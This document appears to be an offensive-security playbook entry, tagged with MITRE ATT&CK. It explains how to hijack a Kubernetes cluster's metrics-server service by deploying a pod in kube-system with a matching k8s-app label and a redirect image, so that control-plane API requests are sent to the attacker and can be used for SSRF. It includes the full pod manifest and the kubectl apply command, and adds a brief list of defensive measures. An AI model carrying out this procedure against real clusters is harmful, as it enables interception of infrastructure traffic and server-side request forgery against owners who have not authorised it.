---
tags:
  - kubernetes
  - hijack
  - pod
type: procedure
tools:
  - '[[tools/kubectl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/kubectl-apply]]'
verified: false
platforms:
  - Kubernetes
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:38.981Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 22046290-9c10-467a-aa4e-10af396f596f
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Deploy-Malicious-Pod-to-Hijack-Metrics-Server

## Summary

Deploys a malicious pod in the kube-system namespace using the same label selector as metrics-server, allowing it to intercept and hijack service traffic for SSRF exploitation.

## Description

This targets aggregated API servers in Kubernetes by deploying a pod that matches the selector (e.g., k8s-app=metrics-server), causing the service to route requests to the attacker-controlled pod. Requires cluster access and YAML manifest (go-redirect.yaml) defining the pod with the image and labels. Outcomes include traffic redirection without altering core Kubernetes configs.

## Requirements

1. kubectl access to kube-system
2. Malicious Docker image pushed or local
3. go-redirect.yaml with matching labels

## Defense

Defensive measures and detection strategies:

- Restrict deployments in kube-system namespace
- Validate pod labels and selectors
- Audit service endpoint changes

## Objectives

1. Hijack metrics-server service endpoints
2. Intercept API requests from control plane
3. Enable redirect-based SSRF

## Instructions

### Step 1: Prepare YAML Manifest

**Context**: Create go-redirect.yaml specifying the pod with labels k8s-app=metrics-server and image weinong/go-redirect.

No command; YAML example:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: malicious-metrics
  namespace: kube-system
  labels:
    k8s-app: metrics-server
spec:
  containers:
  - name: redirect
    image: weinong/go-redirect
    ports:
    - containerPort: 8080
```

> Ensures selector match for hijacking.

### Step 2: Apply Deployment

**Context**: Use kubectl to deploy the pod, updating service endpoints.

**Command** ([[commands/kubectl-apply]]):

```bash
kubectl apply -f go-redirect.yaml
```

> Deploys pod; expected output: pod/malicious-metrics created.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/kubectl-apply]]

## Tools Used

- [[tools/kubectl]]

## Tags

- kubernetes
- hijack
- pod
